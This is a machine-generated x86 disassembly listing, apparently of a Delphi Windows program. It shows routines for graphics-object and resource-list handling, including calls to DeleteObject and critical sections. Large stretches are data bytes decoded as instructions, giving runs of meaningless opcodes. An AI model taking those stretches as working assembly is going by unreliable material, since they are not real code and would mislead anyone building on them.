add [ edi - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] bl
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] al
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] cl
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ eax ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] dh
inc esi
dec eax
add [ esi ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] bh
inc esi
dec eax
add [ esi ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] ah
inc esi
dec eax
add [ esi ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41b755
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b75c
retn
sub_41b768
insb
mov bh 0x41
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
int3
sub_41b784
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_41bc03
push esp
inc esi
outsd
outsb
je r-xdata
inc ecx
add [ ebx + edi * 4 ] ch
mov esp 0x5070041
push esp
inc esi
outsd
outsb
je r-xdata
add al [ eax ]
push es
dec eax
jo r-xdata
add [ eax ] al
pop eax
mov ebx 0x200041
add [ eax ] al
add [ eax ] eax
std
[ eax + 0x50041d2 ]
inc ecx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
mov ebx 0xbb2c0041
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
pop eax
mov ebp 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ecx
add [ eax ] ch
salc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
mov [ eax - 0x29efffbf ] bh
imul esp [ ebx + 0x73 ] 0xb8980007
inc ecx
add [ eax ] ch
xlat
inc ecx
add [ eax ] dh
xlat
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
adc dl bl
inc ecx
add [ eax ] bl
fiadd [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
add eax 0x74646957
push 0xbe58c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x42 ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 + 0x41 ] ah
add [ eax ] bl
add [ eax ] al
add [ edx + edi * 4 + 0x34e80041 ] bh
inc eax
imul esp [ ebx + 0x73 ] 0xb7680004
inc ecx
add ah ah
fadd [ ecx ]
in al dx
fadd [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
rcl dh 0x41
add ah cl
salc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xlat
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
mov bh 0x41
add [ eax ] bl
add [ eax ] al
inc [ eax ]
aam 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
jae r-xdata
add [ eax ] al
mov esp 0xe80041ba
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
pushfd
xlat
inc ecx
add [ eax ] bl
inc ebp
inc ecx
add [ eax ] ah
inc ebp
inc ecx
add ah al
xlat
inc ecx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
jo r-xdata
sbb al 0x0
mov ecx 0x180041
add bh bh
int3
add [ ebp + edi * 4 + 0x41 ] ah
add [ eax + eax ] bl
inc ecx
add [ edi ] al
add al 0x54
push eax
outsb
pop eax
mov ebp 0xbb2c0041
inc ecx
add [ eax + eax ] al
popad
insd
inc esp
mov eax 0xd6f80041
inc ecx
add [ eax ] al
adc [ eax ] al
loopne r-xdata
jns r-xdata
jae r-xdata
inc ecx
add [ eax ] bl
add [ eax ] al
push esp
sbb al [ ecx ]
call 0xfffffffff441ff35
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
add dh bl
inc ecx
add [ eax ] bl
inc ebp
inc ecx
add [ eax ] ah
inc ebp
inc ecx
add [ esp + eax * 2 ] dh
inc ecx
add [ eax - 0x1a ] al
inc ecx
add [ esi ] ch
inc ecx
add [ eax - 0x1b ] ah
inc ecx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x41 ] al
inc ecx
add [ eax ] al
add [ eax ] al
nop
jo r-xdata
popad
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x41b88874
add [ eax ] dl
salc
inc ecx
add al ch
aad 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
add al 0x24
outsd
or [ gs : ecx + eax * 2 + 0xc00 ] bh
jmp eax
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
mov edi 0x7070041
push esp
inc ebx
popad
outsb
jbe r-xdata
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
test dl bl
inc ecx
add [ eax ] bl
inc ebp
inc ecx
add [ eax ] ah
inc ebp
inc ecx
add [ edx + ebx * 8 + 0x54060041 ] ch
inc edx
jb r-xdata
mov esi 0x180041
add [ eax ] al
mov esp 0xe80041ba
xor al 0x40
inc ecx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
test dh dl
inc ecx
add [ eax + 0x41d6 ] ah
add [ eax ] al
add [ eax ] al
je r-xdata
add al 0xdc
jmp sub_414648
dec ebp
loopne r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + edi * 4 ] dh
jae r-xdata
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
inc ecx
cld
jecxz r-xdata
mov edi 0x1ac80041
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc eax
mov edi 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
mov esi 0xbb2c0041
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
add dh ch
mov edi 0x10041
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fstp [ esi ]
rol [ ecx ] 0x24
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41c0a0c0 ] cl
add [ edx ] dh
rol [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 ] al
inc ecx
add [ ecx + eax * 8 ] cl
inc ecx
add [ eax ] ch
add [ eax ] al
add [ ebx + ebx + 0x41 ] al
add al ch
xor al 0x40
add al bl
inc ebp
inc ecx
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
or [ ecx + eax * 2 ] al
sbb [ ebp + 0x41 ] al
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + eax * 2 ] dh
inc ecx
add [ eax + 0x46 ] ch
inc ecx
add [ edx + edi * 8 + 0x2aa80041 ] dl
inc eax
add [ eax - 0x5 ] dl
inc ecx
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
cwde
cld
inc ecx
add [ esp + edi * 8 + 0x2aa80041 ] bl
inc eax
add [ edi * 8 + 0x2aa80041 ] bl
inc eax
add [ eax - 0x7bffbe03 ] al
std
inc ecx
add [ eax - 0x6bffbfd6 ] ch
std
inc ecx
add [ edx + edi * 8 + 0x41 ] bl
add [ eax + 0x280041fc ] ah
std
inc ecx
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax + 0x100402a ] ch
add ch bh
push esp
cld
inc ecx
add [ eax ] cl
push esp
inc edi
jb r-xdata
mov ebp 0x100041
add bh bh
jecxz r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
imul esp [ ebx + 0x73 ] 0xbe6c0004
inc ecx
add [ eax + eax ] dl
add bh bh
add [ eax ] al
add [ eax ] al
jo r-xdata
dec ebp
rol [ ecx ] 0x5b
rol [ ecx ] 0x65
jo r-xdata
retn
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
xor al 0xbf
imul esp [ ebx + 0x73 ] 0xb7680002
inc ecx
add ah ah
fild [ ecx ]
in al dx
fild [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
rol [ ecx ] 0x3d
rol [ ecx ] 0x45
rol [ ecx ] 0x1
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
imul esp [ ebx - 0x73 ] 0xc11c0040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
add [ eax ] al
mov edx 0xdd000041
inc ecx
add [ eax ] cl
fld [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
sbb al 0xbf
inc ecx
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x60 ] 0xc80041c0
sbb eax [ ecx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ edx + eax * 8 ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
retn 0x41
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fnsave [ edx - 0x3f ]
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41c1f4c0 ] cl
add [ esi + 0x41c1 ] al
add [ eax ] al
add [ edx + eax * 8 ] al
aam 0x11
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
hlt
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4200c8
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_41c2b8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xc3
inc ecx
add [ eax + eax ] ah
add [ eax ] al
push esp
retn 0x41
sub_41c318
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xc3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
retn
sub_41c336
inc ecx
add [ eax ] dh
add [ eax ] al
add [ eax + eax * 8 + 0x41 ] dl
add al ch
xor al 0x40
add al bl
inc ebp
inc ecx
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
xor al 0x6
inc edx
add [ eax ] bl
inc ebp
inc ecx
add [ ebx + edi * 8 ] al
inc ecx
add [ esi + eax + 0x42 ] ah
add [ eax + 0x46 ] ch
inc ecx
add [ edx + edi * 8 + 0x6f80041 ] dl
inc edx
add [ eax - 0x5 ] dl
inc ecx
add [ eax - 0x6fffbdf9 ] cl
pop es
inc edx
add ah dh
pop es
inc edx
add [ esp + edi * 8 + 0x8800041 ] bl
inc edx
add [ eax + 0x9 ] ah
inc edx
add ah bh
or al 0x42
add [ eax - 0x17ffbe03 ] al
or eax 0xdec0042
inc edx
add [ edi + ecx + 0x42 ] al
add ah ch
add eax 0xfca00042
inc ecx
add [ esp + ecx ] bl
inc edx
add ah ah
or [ edx ] al
loopne r-xdata
dec ebp
je r-xdata
inc edx
add [ eax + 0x1c004211 ] bl
adc al [ edx ]
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sub al 0x16
inc edx
add [ eax + 0xc004216 ] cl
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
mov al [ 0x41c4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax * 8 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc ch al
inc ecx
add [ eax + eax ] bh
add [ eax ] al
push esp
rol [ ecx ] 0xe8
xor al 0x40
add al bl
inc ebp
inc ecx
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sbb [ ecx ] ah
inc edx
add [ eax ] bl
inc ebp
inc ecx
add [ ebx + edi * 8 ] al
inc ecx
add [ ecx + 0x42 ] dl
add [ eax + 0x46 ] ch
inc ecx
add [ eax ] ch
and eax [ edx ]
test al 0x23
inc edx
add [ eax - 0x5 ] dl
inc ecx
add [ esi + 0x42 ] bl
add [ eax ] dl
daa
inc edx
add [ eax + 0x27 ] dl
inc edx
add [ esp + edi * 8 + 0x27ac0041 ] bl
inc edx
add [ eax - 0x6bffbdd5 ] bl
xor eax [ edx ]
push 0x84004234
std
inc ecx
add [ ebp + esi + 0x35e00042 ] cl
inc edx
add [ eax - 0x5fffbde0 ] dh
cld
inc ecx
add [ eax ] ch
std
inc ecx
add [ edx + ebp + 0x42 ] dh
add [ eax - 0xfffbdc8 ] ah
sub [ edx ] eax
test al 0x38
inc edx
add al al
inc edx
add [ eax ] ah
daa
inc edx
add [ edx + esi + 0x42 ] bl
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41c51c70
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41c4a070
add [ eax ] bl
rol [ ecx ] 0x0
add [ eax ] cl
inc edi
jb r-xdata
imul bp [ ebp - 0x75 ] 0xd4c0
retn
popad
nop
in al 0xc5
inc ecx
add [ eax ] al
jo r-xdata
inc eax
add [ edi + eax * 8 ] dh
inc ecx
add [ eax ] dl
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3a ] cl
inc ecx
add [ eax + eax ] dh
add [ eax ] al
push esp
rol [ ecx ] 0xe8
xor al 0x40
add al bl
inc ebp
inc ecx
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
in al 0x39
inc edx
add [ eax ] bl
inc ebp
inc ecx
add [ ebx + edi * 8 ] al
inc ecx
add [ edx + edi ] dl
inc edx
add [ eax + 0x46 ] ch
inc ecx
add [ edx + edi * 8 + 0x3a740041 ] dl
inc edx
add [ eax - 0x5 ] dl
inc ecx
add [ edx + edi + 0x3ae00042 ] dh
inc edx
add [ eax - 0x63ffbe04 ] bl
cld
inc ecx
add ah dh
cmp al [ edx ]
sbb al 0xfd
inc ecx
add [ eax + 0x3d ] bh
inc edx
add [ eax - 0x6fffbe03 ] al
cmp eax 0x3d940042
inc edx
add [ ebp + edi * 8 + 0x39900041 ] dl
inc edx
add [ eax + 0x280041fc ] ah
std
inc ecx
add [ esp + edi ] dh
inc edx
add [ ebp + edi + 0x3dd40042 ] ch
inc edx
add al ch
cmp eax 0x54050042
dec ecx
arpl [ edi + 0x6e ] bp
mov eax eax
push esp
mov [ ecx ] 0x7
add eax 0x6f634954
outsb
in al 0xc5
inc ecx
add [ eax ] bl
rol [ ecx ] 0x0
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
mov ch al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 8 + 0x180041 ] cl
add [ eax ] al
push esp
retn 0x41
cdq
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403614
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41c684
rol dh 0x1
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov [ ecx ] 0x24
add [ eax ] al
add [ eax - 0x17ffbff0 ] ah
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
xor al 0xc7
inc ecx
add [ eax ] dl
push esp
push edx
jae r-xdata
cdq
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41c6f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41c734
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_41c770
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41c6e4
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41c758
xor edx edx
push ebp
push sub_41c844
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c84b
mov eax [ ebp - 0x4 ]
call sub_41c764
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407da4
test al al
je r-xdata
sub_41c854
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c758
xor ecx ecx
push ebp
push sub_41c8db
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c764
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41c904
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c758
xor eax eax
push ebp
push sub_41c96d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c770
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41c854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c974
mov eax [ ebp - 0x4 ]
call sub_41c764
retn
mov eax ebx
mov si 0xfffd
call sub_40349c
sub_41c97c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c758
xor eax eax
push ebp
push sub_41c9d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c9df
mov eax [ ebp - 0x4 ]
call sub_41c764
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_40349c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c854
sub_41c9e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c758
xor edx edx
push ebp
push sub_41ca47
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca4e
mov eax [ ebp - 0x4 ]
call sub_41c764
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
